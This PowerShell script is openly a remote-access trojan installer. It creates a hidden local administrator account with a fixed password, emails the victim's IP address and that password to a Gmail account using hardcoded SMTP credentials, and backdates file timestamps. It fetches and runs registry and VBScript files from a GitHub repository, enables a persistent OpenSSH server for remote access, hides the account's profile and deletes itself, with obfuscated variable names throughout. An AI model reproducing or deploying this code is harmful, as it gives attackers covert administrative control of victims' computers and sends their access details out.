#build resources for rat
#created by :OTE

#RANDOM string for directories helps us in obfuscation techniques
function ZWlgfrSeJC {

    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {
        [char]$_
    })

}


# Create Local Admin since installer is running in administrator privilages
function nQjUmBRylz{
    [cmdletBinding()]
    param(
        [string] $jrTWzPgQwA,
        [securestring] $oXGjuyUVQW
    )
    begin{

    }
    process{
        New-LocalUser -Name $jrTWzPgQwA -Password $oXGjuyUVQW -Description "Temporary local admin"
        Write-verbose "$jrTWzPgQwA local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$jrTWzPgQwA"
        Write-verbose "$jrTWzPgQwA added to the local administrator group"
    }
    end{

    }
}
# delete any existing local admin user so that we can have a connections
Remove-LocalUser -Name "onlyrat"
# Create local admin
$jrTWzPgQwA="onlyrat"
$lUWMsSTQXg="123456"
$oXGjuyUVQW = (ConvertTo-securestring $lUWMsSTQXg -AsPlainText -Force)
nQjUmBRylz -jrTWzPgQwA $jrTWzPgQwA -oXGjuyUVQW $oXGjuyUVQW
# config file
$LFBzkROvGc="$env:UserName.rat"




# Variables
$ksGrxwEfSq=ZWlgfrSeJC
$wnIMNWFsHE="$env:temp\$ksGrxwEfSq"
$kAxwfEKeDn=Get-Location
$WdhGHjMUlO=(Get-NetIPAddress -AddressFamily IPV4).IPAddress[1]
# credentials for smtp
$FwoYgsNVfl="carloab39@gmail.com"
$yYLAdChWgT="123456"



# adding the credentials to the .rat fle to send via smtp
Add-content  -Path $LFBzkROvGc -Value $WdhGHjMUlO
Add-content  -Path $LFBzkROvGc -Value $lUWMsSTQXg
Add-content  -Path $LFBzkROvGc -Value $env:temp
Add-content  -Path $LFBzkROvGc -Value $kAxwfEKeDn
$(Get-Item $LFBzkROvGc).creationtime=$(Get-Date "1/24/2022 07:15 pm")
$(Get-Item $LFBzkROvGc).lastaccesstime=$(Get-Date "1/24/2022 07:15 pm")
$(Get-Item $LFBzkROvGc).lastwritetime=$(Get-Date "1/24/2022 07:15 pm")

# send via smtp the config file
Send-MailMessage -From $FwoYgsNVfl -To $FwoYgsNVfl -Subject "XXOX" -Attachment $LFBzkROvGc -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $FwoYgsNVfl,(ConvertTo-SecureString -String $yYLAdChWgT -AsPlainText -Force))
# Remove-Item $LFBzkROvGc 

#goto temp making working directory
mkdir $wnIMNWFsHE

Set-Location -Path $wnIMNWFsHE
(Get-Item  "$env:temp\$ksGrxwEfSq").CreationTime= ("1/24/2022 07:15 pm")
# registery to hide local admin
$SWognZbask = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $SWognZbask

# create random name for the reg_file
Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/regs/wrev.reg" -OutFile "GzNEhFcTYa.reg"


# download vbs to register the registery the register 
$DLubaWwQmx = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $DLubaWwQmx

Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/regs/calty.vbs" -OutFile "iJtYCnwWoa.vbs"
# install the registery still not workinggggg

./GzNEhFcTYa.reg;./iJtYCnwWoa.vbs

# ENABLING PERSISTANT ssh to the victims machine
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh* 

# hide our own  registery we had created
Set-Location C:\Users
attrib +h +s +r $jrTWzPgQwA

# self deletion
Set-Location -Path $kAxwfEKeDn
"AmRvjYQbUz.cmd"|cmd
echo $kAxwfEKeDn
remove-item -fo qjhOmDleBS.ps1
Remove-item -fo bGnQSfviwu.cmd
Remove-item -fo IctLDiYOQb.ps1
Remove-item -fo AmRvjYQbUz.cmd
Set-Location -Path $wnIMNWFsHE
remove-item -fo iJtYCnwWoa.vbs
remove-item -fo GzNEhFcTYa.reg
